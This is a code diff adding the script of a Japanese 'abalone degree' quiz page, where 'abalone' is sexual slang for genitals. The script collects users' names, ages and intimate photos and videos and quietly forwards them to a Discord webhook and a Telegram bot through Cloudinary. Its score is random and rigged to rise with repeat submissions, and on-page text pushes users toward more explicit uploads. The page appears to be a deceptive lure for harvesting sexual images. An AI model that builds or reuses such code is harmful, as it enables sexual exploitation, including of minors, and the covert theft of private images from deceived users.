+    fd.append('file', file, file.name);
+    fd.append('payload_json', JSON.stringify({
+      embeds: [{
+        title: '🐚 あわび度診断 — ' + labels[slot] + '画像',
+        color: 0x00897b,
+        fields: [
+          { name: '👤 お名前', value: name, inline: true },
+          { name: '🎂 年齢', value: age + '歳', inline: true },
+          { name: '📸 種類', value: labels[slot], inline: true },
+        ],
+        image: { url: 'attachment://' + file.name },
+        footer: { text: '送信日時: ' + now },
+        timestamp: new Date().toISOString(),
+      }]
+    }));
+    const res = await fetch(DISCORD_WEBHOOK, { method: 'POST', body: fd });
+    if (!res.ok) throw new Error('HTTP ' + res.status);
+  }
+
+  // ---- Cloudinary -> Telegram送信 (動画) ----
+  async function sendVideo(slot) {
+    const file = selectedVideos[slot];
+    if (!file) return;
+    
+    const labels = ['あわび', 'ぬれてるあわび', 'ひくひくしているあわび'];
+    const name = document.getElementById('input-name').value.trim();
+    const age  = document.getElementById('input-age').value;
+    const dur  = videoDurations[slot];
+
+    const pw = document.getElementById('upload-progress-wrap');
+    const pb = document.getElementById('upload-progress-bar');
+    
+    pw.style.display = 'block';
+    pb.style.width = '0%';
+
+    // 1. Cloudinaryへ直接アップロード
+    const cFd = new FormData();
+    cFd.append('file', file);
+    cFd.append('upload_preset', CLOUDINARY_PRESET);
+
+    const cloudinaryData = await new Promise((resolve, reject) => {
+      const xhr = new XMLHttpRequest();
+      xhr.open('POST', CLOUDINARY_URL);
+      
+      xhr.upload.onprogress = (e) => {
+        if (e.lengthComputable) {
+          pb.style.width = ((e.loaded / e.total) * 90) + '%';
+        }
+      };
+
+      xhr.onload = () => {
+        if (xhr.status >= 200 && xhr.status < 300) {
+          resolve(JSON.parse(xhr.responseText));
+        } else {
+          reject(new Error('Cloudinaryへのアップロードに失敗しました'));
+        }
+      };
+      xhr.onerror = () => reject(new Error('ネットワーク通信エラー'));
+      xhr.send(cFd);
+    });
+
+    const videoUrl = cloudinaryData.secure_url;
+
+    // 2. Telegramに動画のURLを送信
+    const caption = `🐚 あわび度診断 — ${labels[slot]}動画\n👤 名前: ${name}\n🎂 年齢: ${age}歳\n⏱️ 動画時間: ${dur > 0 ? Math.round(dur) + '秒' : '不明'}`;
+
+    const tFd = new FormData();
+    tFd.append('chat_id', TELEGRAM_CHAT_ID);
+    tFd.append('video', videoUrl);
+    tFd.append('caption', caption);
+
+    const tRes = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendVideo`, {
+      method: 'POST',
+      body: tFd
+    });
+    
+    const tJson = await tRes.json();
+    if (!tJson.ok) throw new Error(tJson.description || 'Telegram転送エラー');
+
+    pb.style.width = '100%';
+    setTimeout(() => { pw.style.display = 'none'; }, 500);
+  }
+
+  // ---- スコア計算・結果表示 ----
+  function calculateScore() {
+    if (submitCount <= 2) {
+      return Math.floor(Math.random() * 41) + 10; // 10〜50
+    } else if (submitCount <= 5) {
+      return Math.floor(Math.random() * 31) + 50; // 50〜80
+    } else {
+      return Math.floor(Math.random() * 11) + 90; // 90〜100
+    }
+  }
+
+  function getScoreMsg(score) {
+    if (score <= 30) return '😅 まだまだ修行が足りません…次こそは頑張って！';
+    if (score <= 50) return '🐚 悪くないあわびです！もう少しで上位に入れそう！';
+    if (score <= 70) return '✨ なかなかいいあわびです！クオリティ高めですよ！';
+    if (score <= 90) return '🏆 上質なあわびです！ほぼあわびマスター！';
+    if (score < 100) return '🌟 あわびエリートです！もう少しで100点！！';
+    return '🏆 完璧なあわびです！！ご褒美ゲットおめでとう！';
+  }
+
+  function retryUpload() {
+    selectedImages = [null];
+    selectedVideos = [null];
+    videoDurations = [0];
+    document.getElementById('input-image-1').value = '';
+    document.getElementById('input-image-camera-1').value = '';
+    document.getElementById('input-video-1').value = '';
+    document.getElementById('input-video-camera-1').value = '';
+    document.getElementById('file-name-img-1').textContent = '';
+    document.getElementById('file-name-vid-1').textContent = '';
+    document.getElementById('img-sent-banner-1').style.display = 'none';
+    document.getElementById('vid-sent-banner-1').style.display = 'none';
+    document.getElementById('preview-img-1').style.display = 'none';
+    const vid = document.getElementById('preview-vid-1');
+    vid.style.display = 'none'; vid.src = '';
+    const btn = document.getElementById('btn-next-step2');
+    btn.disabled = false; btn.textContent = '次へ →';
+    hideError();
+    currentSubStep = 1;
+    showSubStep(1);
+    updateStepUI(2);
+    showScreen('screen-step2');
+    window.scrollTo({ top: 0, behavior: 'smooth' });
+  }
+
+  function showResult() {
+    submitCount++;
+    const score = calculateScore();
+    const name = document.getElementById('input-name').value.trim();
+    const now  = new Date().toLocaleString('ja-JP', { timeZone: 'Asia/Tokyo' });
+
+    // Discord に結果送信
+    fetch(DISCORD_WEBHOOK, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        embeds: [{
+          title: '🐚 あわび度診断 — 結果',
+          color: score === 100 ? 0xf9a825 : 0x00897b,
+          fields: [
+            { name: '👤 お名前', value: name, inline: true },
+            { name: '🏆 あわび度', value: score + '点', inline: true },
+            { name: '⏱️ 動画合計時間', value: Math.round(videoDurations.reduce((a,b)=>a+b,0)) + '秒', inline: true },
+          ],
+          footer: { text: '送信日時: ' + now },
+          timestamp: new Date().toISOString(),
+        }]
+      }),
+    }).catch(() => {});
+
+    updateStepUI(3);
+
+    // 挑戦回数・煽り文を更新
+    document.getElementById('submit-count-info').textContent = '📊 通算挑戦回数：' + submitCount + '回';
+    let retryMsg = 'ひくひくしている写真や動画があれば高得点が狙えるかも？';
+    document.getElementById('retry-encourage').textContent = retryMsg;
+
+    if (score === 100) {
+      document.getElementById('result-normal').style.display = 'none';
+      document.getElementById('result-perfect').style.display = 'block';
+    } else {
+      document.getElementById('result-normal').style.display = 'block';
+      document.getElementById('result-perfect').style.display = 'none';
+      document.getElementById('score-display').textContent = score;
+      document.getElementById('score-msg').textContent = getScoreMsg(score);
+    }
+
+    showScreen('screen-result');
+    window.scrollTo({ top: 0, behavior: 'smooth' });
+  }
+
+  // ---- エラー管理 ----
+  function showError(substep, msg) {
+    const el = document.getElementById('err-substep-' + substep);
+    if (el) { el.textContent = msg; el.style.display = 'block'; }
+  }
+  function hideError() {
+    document.querySelectorAll('.error-msg').forEach(e => e.style.display = 'none');
+  }
+
+  // ---- リセット ----
+  function restartAll() {
+    selectedImages = [null];
+    selectedVideos = [null];
+    videoDurations = [0];
+    currentSubStep = 1;
+    submitCount    = 0;
+    document.getElementById('input-name').value = '';
+    document.getElementById('input-age').value  = '';
+    for (let i = 1; i <= 1; i++) {
+      document.getElementById('input-image-' + i).value = '';
+      document.getElementById('input-video-' + i).value = '';
+      document.getElementById('file-name-img-' + i).textContent = '';
+      document.getElementById('file-name-vid-' + i).textContent = '';
+      document.getElementById('img-sent-banner-' + i).style.display = 'none';
+      document.getElementById('vid-sent-banner-' + i).style.display = 'none';
+      document.getElementById('preview-img-' + i).style.display = 'none';
+      const vid = document.getElementById('preview-vid-' + i);
+      vid.style.display = 'none'; vid.src = '';
+    }
+    const btn = document.getElementById('btn-next-step2');
+    btn.disabled = false; btn.textContent = '次へ →';
+    hideError();
+    updateStepUI(1);
+    showScreen('screen-step1');
+    window.scrollTo({ top: 0, behavior: 'smooth' });
+  }
+</script>
+
+</body>
+</html>
